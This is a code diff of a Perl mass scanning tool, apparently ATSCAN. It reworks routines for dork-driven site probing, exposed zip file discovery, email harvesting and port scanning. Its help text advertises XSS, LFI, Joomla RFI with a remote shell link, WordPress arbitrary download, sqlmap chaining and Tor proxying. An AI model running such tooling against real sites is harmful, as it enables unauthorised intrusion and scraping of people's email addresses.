+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mzipsites
 sub mzipsites {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   ZIP();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2654,10 +2458,7 @@ sub mzipsites {
     $URL = checkurltype($URL);
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	my $printarget = $URL;
-	if (index($URL, 'http://') != -1) {
-	  $URL =~ s/http:\/\///g;
-	}
-	$URL =~ s/\/.*//s;
+	$URL =~ s/=.*/=/s;
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
@@ -2665,78 +2466,55 @@ sub mzipsites {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);
 	foreach $ZIP(@ZIP){
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$ZIP \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
       $URL1 = $URL.$ZIP;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-      if ($response->is_success and !$response->previous) {
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-		open (INFO, '>>scan.txt');
-        print INFO "$URL\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+	  $yes='a';
+      $no = 'iikiiiix';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "zip".getlist()) {unlink "zip_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "zip_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/zip_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "zip_".getlist()) {unlink "zip_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "zip_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/zip_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-################################################################
-################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mmails
 sub mmails {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
+  if (-e "scan2.txt") {unlink "scan2.txt";}
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2759,64 +2537,43 @@ sub mmails {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
-	print "[!] TARGET:  ";
+	print color 'bold';
+	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
-    print "$URL\n";
+	print color 'blue';
+	print "$printarget\n";
 	print color RESET;
-	print color 'bold yellow';
-	print "    E-MAILS: \n";
-	print color RESET;
-    $request = HTTP::Request->new('GET', $URL);
-    my $response = $ua->request($request);
-    my $html = $response->content;
-	if ($html =~ /((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})/g) {
-	  my $mail=$1;
-	  if (defined $mail) {
-	    print color 'green';
-        print "      $mail\n";
-	    print color RESET;
-        open (INFO, '>>scan2.txt');
-        print INFO "$URL\n   $mail\n";
-        close (INFO);
-        open (INFO, '>>scan.txt');
-        print INFO "$mail\n";
-        close (INFO);
-	  }
-	}else{
-	  print color 'red';
-      print "      No Address E-mail found!\n";
-	  print color RESET;
-	}
+    $URL1 = $URL;
+	$URL1 =~ s/ //g;
+    $yes = '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';
+    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	$cmails='';
+	checkedurl();
     print "[ ]............................................................................ \n";
   }
+  print "[ ]............................................................................ \n";
   close(TEXT);
-  if ((!defined $command) && (!defined $mports)) {
-	unlink 'scan2.txt';
-    finmodule();
+  if (-e "mails_".getlist()) {unlink "mails_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan2.txt', "mails_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/mails_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "mails_".getlist()) {unlink "mails_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan2.txt', "mails_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/mails_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $command) && (!defined $mports)) {
+    exit();
     unlink 'scan2.txt';
   }
 }
-################################################################
-################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub mmd5 {
   scandetail();
   print color 'bold';
@@ -2826,14 +2583,22 @@ sub mmd5 {
   print "[ ]............................................................................ \n";
   print color RESET;
   forwait();
+  print color 'bold';
+  print "    STRING: ";
+  print color RESET;
+  print color 'blue';
+  print "$mmd5\n";
+  print color RESET;
+  print color 'bold';
+  print "    MD5:    ";
+  print color RESET;
   print color 'green';
-  print "    MD5 => ";
   print Digest::MD5->md5_hex("$mmd5");
   print "\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub mencode64 {
   scandetail();
   print color 'bold';
@@ -2843,13 +2608,22 @@ sub mencode64 {
   print "[ ]............................................................................ \n";
   print color RESET;
   forwait();
+  print color 'bold';
+  print "    STRING: ";
+  print color RESET;
+  print color 'blue';
+  print "$mencode64\n";
+  print color RESET;
   my $sss=encode_base64($mencode64);
+  print color 'bold';
+  print "    ENCODE: ";
+  print color RESET;
   print color 'green';
-  print "[!] Base64 encoded => $sss\n";
+  print "$sss\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub mdecode64 {
   scandetail();
   print color 'bold';
@@ -2859,17 +2633,26 @@ sub mdecode64 {
   print "[ ]............................................................................ \n";
   print color RESET;
   forwait();
+  print color 'bold';
+  print "    STRING: ";
+  print color RESET;
+  print color 'blue';
+  print "$mdecode64\n";
+  print color RESET;
   my $rrr=decode_base64($mdecode64);
+  print color 'bold';
+  print "    DECODE: ";
+  print color RESET;
   print color 'green';
-  print "[!] Base64 decoded => $rrr \n";
+  print "$rrr\n";
   print color RESET;
 }
 
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub resumeportscan {
   if (defined $mports) {
-    print color 'bold yellow';
+    print color 'bold';
     print "    INFO:   ";
     print color RESET;
     if (defined $mbasic) {
@@ -2898,11 +2681,11 @@ sub resumeportscan {
     print "\n";
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub basic {
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2923,10 +2706,12 @@ sub basic {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
+	print color 'blue';
+	print "$URL \n";
+	print color RESET;
 	resumeportscan();
 	$URL=$URL;
     $type=$_[0];
@@ -2937,15 +2722,15 @@ sub basic {
 	  if (defined $socket) {
         close $socket;
 	  }
-	  print color 'bold yellow';
+	  print color 'bold';
       print "        TYPE:  ";
       print color RESET;
       print "$type  ";
-	  print color 'bold yellow';
+	  print color 'bold';
       print "PORT:  ";
       print color RESET;
       print "$port1  ";
-	  print color 'bold yellow';
+	  print color 'bold';
       print "INFO:  ";
       print color RESET;
       if ($closed1==0){
@@ -2967,12 +2752,11 @@ sub basic {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub basic2 {
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2993,10 +2777,12 @@ sub basic2 {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
+	print color 'blue';
 	print "$URL \n";
+	print color RESET;
     resumeportscan();
 	$URL=$URL;
     $closed2=0;
@@ -3013,30 +2799,30 @@ sub basic2 {
           close $socket2;
 	    }	
 	    if ($closed2==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port2  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port2  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3045,30 +2831,30 @@ sub basic2 {
 	  }
 	  
       if ($closed3==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port2  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port2  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3086,13 +2872,12 @@ sub basic2 {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub complete {
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3116,27 +2901,29 @@ sub complete {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
+	print color 'blue';
+	print "$URL \n";
+	print color RESET;
     resumeportscan();
     while ($port3<=65535){
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
 	  if (defined $socket) {
         close $socket;
 	  }
-	  print color 'bold yellow';
+	  print color 'bold';
       print "        TYPE:  ";
       print color RESET;
       print "$type2  ";
 
-	  print color 'bold yellow';
+	  print color 'bold';
       print "PORT:  ";
       print color RESET;
       print "$port3  ";
 	  
-	  print color 'bold yellow';
+	  print color 'bold';
       print "INFO:  ";
       print color RESET;
 	  
@@ -3160,13 +2947,12 @@ sub complete {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub complete2 {
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3191,10 +2977,12 @@ sub complete2 {
 	  countsearchlist();
 	  print "]\n";
 	  print color RESET;
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "[!] TARGET: ";
 	  print color RESET;
-	  print "$Target \n";
+	  print color 'blue';
+	  print "$URL \n";
+	  print color RESET;
       resumeportscan();
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
 	  if (defined $socket) {
@@ -3205,30 +2993,31 @@ sub complete2 {
         close $socket2;
 	  }
       if ($closed4==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
+
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3236,30 +3025,30 @@ sub complete2 {
         print color RESET;
 	  }
       if ($closed5==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3279,8 +3068,8 @@ sub complete2 {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub subuser {
   if ((!defined $mstart) || (!defined $mend)) {
     print color 'yellow';
@@ -3295,13 +3084,12 @@ sub subuser {
     chomp($mend);
   }
 }
-
-###########
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub user {
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3330,26 +3118,28 @@ sub user {
 	  countsearchlist();
 	  print "]\n";
 	  print color RESET;
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    [!] TARGET: ";
 	  print color RESET;
-	  print "$URL\n";
+	  print color 'blue';
+	  print "$URL \n";
+	  print color RESET;
       resumeportscan();
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
       if (defined $socket) {
         close $socket;
 	  }
-	  print color 'bold yellow';
+	  print color 'bold';
       print "        TYPE:  ";
       print color RESET;
       print "$type3  ";
 
-	  print color 'bold yellow';
+	  print color 'bold';
       print "PORT:  ";
       print color RESET;
       print "$mstart  ";
 	  
-	  print color 'bold yellow';
+	  print color 'bold';
       print "INFO:  ";
       print color RESET;
       if ($closed6==0){
@@ -3373,12 +3163,12 @@ sub user {
   print color RESET;
 }
 
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub user2 {
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3402,10 +3192,12 @@ sub user2 {
 	  countsearchlist();
 	  print "]\n";
 	  print color RESET;
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "[!] TARGET: ";
 	  print color RESET;
+	  print color 'blue';
 	  print "$URL \n";
+	  print color RESET;
       resumeportscan();
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
 	  if (defined $socket) {
@@ -3416,30 +3208,30 @@ sub user2 {
         close $socket2;
 	  }
       if ($closed7==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$mstart  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$mstart  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3447,30 +3239,30 @@ sub user2 {
         print color RESET;
 	  }
       if ($closed8==0){
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'green';
         print "Open!\n";
         print color RESET;
 	  }else{
-	    print color 'bold yellow';
+	    print color 'bold';
         print "        TYPE:  ";
         print color RESET;
         print "udp  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "PORT:  ";
         print color RESET;
         print "$port4  ";
-	    print color 'bold yellow';
+	    print color 'bold';
         print "INFO:  ";
         print color RESET;
 		print color 'red';
@@ -3490,8 +3282,8 @@ sub user2 {
   print color RESET;
 }
 
-################################################################
-################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub mabout {
   print color 'bold';
   print "[ ]............................................................................ \n";
@@ -3517,55 +3309,52 @@ sub mabout {
     \n";
   print color 'magenta', RESET;
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub help {
   print color 'bold';
   print "[ ]............................................................................ \n\n";
   print color 'bold yellow';
   print "[..] HELP:: \n";
   print color RESET;
-  print "   --proxy       | set tor proxy [EX: socks://localhost:9050]\n";
-  print "   -dork         | dork to search [Ex: house,cars,hotel] \n";
+  print "   --proxy       | Set tor proxy [EX: socks://localhost:9050]\n";
+  print "   -dork         | Dork to search [Ex: house,cars,hotel] \n";
   print "   --level       | Scan level (+- Number of page results to scan) \n";
-  print "   -t            | target \n";
-  print "   --sqlmap      | sqlmaping xss results \n";
-  print "   --xss         | xss scan \n";
-  print "   --lfi         | local file inclusion \n";
-  print "   --joomrfi     | get joomla sites with rfi in the server \n";
-  print "   --shell       | shell link [Ex: http://www.site.com/shell.txt] \n";
-  print "   --wpadf       | get wordpress sites with arbitery file download in the server\n";
-  print "   --admin       | get site admin page \n";
-  print "   --shost       | get site subdomains \n";
-  print "   --ports       | scan server ports \n";
-  print "   --start       | start scan port \n";
-  print "   --end         | end scan port \n";
-  print "   --all         | complete mode \n";
-  print "   --basic       | basic mode \n";
+  print "   -t            | Target \n";
+  print "   --sqlmap      | Sqlmaping xss results \n";
+  print "   --xss         | Xss scan \n";
+  print "   --lfi         | Local file inclusion \n";
+  print "   --joomrfi     | Get joomla sites with rfi in the server \n";
+  print "   --shell       | Shell link [Ex: http://www.site.com/shell.txt] \n";
+  print "   --wpadf       | Get wordpress sites with arbitery file download in the server\n";
+  print "   --admin       | Get site admin page \n";
+  print "   --shost       | Get site subdomains \n";
+  print "   --ports       | Scan server ports \n";
+  print "   --start       | Start scan port \n";
+  print "   --end         | End scan port \n";
+  print "   --all         | Complete mode \n";
+  print "   --basic       | Basic mode \n";
   print "   --select      | Select mode you can set rang of ports \n";
-  print "   --sites       | sites in the server \n";
-  print "   --wp          | wordpress sites in the server\n";
-  print "   --joom        | joomla sites in the server\n";
-  print "   --upload      | get sites with upload files in the server  \n";
-  print "   --zip         | get sites with zip files in the server \n";
-  print "   --md5         | convert to md5 \n";
-  print "   --encode64    | encode base64 string \n";
+  print "   --sites       | Sites in the server \n";
+  print "   --wp          | Wordpress sites in the server\n";
+  print "   --joom        | Joomla sites in the server\n";
+  print "   --upload      | Get sites with upload files in the server  \n";
+  print "   --zip         | Get sites with zip files in the server \n";
+  print "   --md5         | Convert to md5 \n";
+  print "   --encode64    | Encode base64 string \n";
   print "   --decode64    | decode base64 string \n";
   print "   --TARGET      | Domain name [Ex: site.com] \n";
   print "   --FULL_TARGET | Full url [Ex: site.com/index.php?id=5] \n";
-  print "   --valid       | text for validate results \n";
-  print "   --exp         | exploit\n";
+  print "   --valid       | Text for validate results \n";
+  print "   --exp         | Exploit\n";
   print "   --command     | Extern Command to execute\n";
-  print "   --isup        | check http status 200. \n";
-  print "   --httpd       | print site httpd version \n";
-  print "   --replace     | string to replace \n";
-  print "   --with        | string to replace with \n";
-  print "   --ip          | Add get ip to scan \n";
+  print "   --isup        | Check http status 200. \n";
+  print "   --replace     | String to replace \n";
+  print "   --with        | String to replace with \n";
   print "   --email       | Get emails \n";
-  print "   --server      | Add get server software to scan \n";
-  print "   --hide        | Hide validation process \n";
-  print "   --save        | File to save scan [by defaut the tool create one if not set!] \n\n";
-  
+  print "   --save        | File to save scan [by defaut the tool create one if not set!]\n";
+  print "   --update      | Check tool update \n\n";
+
   print color 'bold yellow';
   print "[..] EXAMPLES: \n\n";
   print color RESET;
@@ -3645,16 +3434,32 @@ sub help {
   print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss --lfi --wp ...\n";
   print "    -t <ip> --level <10> --xss --lfi --wp ... \n";
   print "    -t <targets> --xss --lfi --wp ... \n";
-}
+  
+  print color 'bold';
+  print "  Check for updates: \n";
+  print color RESET;
+  print "    --update\n\n";
 
-##############################################################
-##############################################################
+  
+  
+  
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (defined $Target) {
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mip) && (!defined $mserver) && (!defined $msites) && (!defined $mmails)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
   advise();
   }
 } 
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+if ((defined $replace) && (defined $with)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
+  advise();
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (defined $msites){
   if (!defined $mlevel) {
     print color 'bold';
@@ -3666,6 +3471,8 @@ if (defined $msites){
 	exit();
   }
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if ((defined $sqlmap) && (!defined $mxss)) {
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3675,7 +3482,8 @@ if ((defined $sqlmap) && (!defined $mxss)) {
   print color 'RESET';
   exit();
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if ((defined $dork) && (!defined $mlevel)) {
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -3685,6 +3493,8 @@ if ((defined $dork) && (!defined $mlevel)) {
   print color 'RESET';
   exit();
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if ((defined $dork) || (defined $Target)) {
   if (defined $mjoomrfi) {
 	if (!defined $shell) {
@@ -3707,9 +3517,11 @@ if ((defined $dork) || (defined $Target)) {
 	exit();
   }
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (defined $mlevel) {
   if ((defined $dork) || (defined $Target)){
-    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mhttpd) && (!defined $mmails)) {
+    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
       submsearch();
       exit();
     }else{
@@ -3718,7 +3530,6 @@ if (defined $mlevel) {
 	    if (defined $misup) { misup();}
 	    if (defined $validation_text) {mvalidation();}
         if (defined $command) {mcommand();}
-	    if (defined $mhttpd) { mhttpd();}
         if (defined $mxss) {
           if (defined $sqlmap) {
 	        mxss(); sqlmap();
@@ -3740,7 +3551,6 @@ if (defined $mlevel) {
 	    if (defined $misup) { misup();}
 	    if (defined $validation_text) {mvalidation();}
         if (defined $command) {mcommand();}
-	    if (defined $mhttpd) { mhttpd();}
         if (defined $mxss) {
           if (defined $sqlmap) {
 	        mxss(); sqlmap();
@@ -3764,10 +3574,11 @@ if (defined $mlevel) {
   }
 }else{
   if (defined $Target) {
+    scandetail();
+	forwait();
     if (defined $misup) {misup();}
     if (defined $validation_text) { mvalidation();}
     if (defined $command) {mcommand();}
-	if (defined $mhttpd) { mhttpd();}
     if (defined $mxss) {
       if (defined $sqlmap) {
 	    mxss(); sqlmap();
@@ -3784,7 +3595,6 @@ if (defined $mlevel) {
 	if (defined $mjoomsites) { mjoomsites();}
 	if (defined $mupload) { muploadsites();}
 	if (defined $mzip) { mzipsites();}
-    if (defined $mhttpd) { mhttpd();}
 	if (defined $mmails) { mmails();}
 	if (defined $mports) { 
       if (defined $mbasic) {
@@ -3813,7 +3623,8 @@ if (defined $mlevel) {
 	exit();
   }
 }
-###################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
   use Digest::MD5;
   use MIME::Base64;
@@ -3821,9 +3632,10 @@ if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
   }elsif (defined $mencode64) { mencode64();exit();
   }elsif (defined $mdecode64) { mdecode64();exit();}
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (defined $mabout) { mabout(); exit();}
+if (defined $checkversion) { checkversion(); exit();}
 if (defined $help) { help(); exit();}
-
-###################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
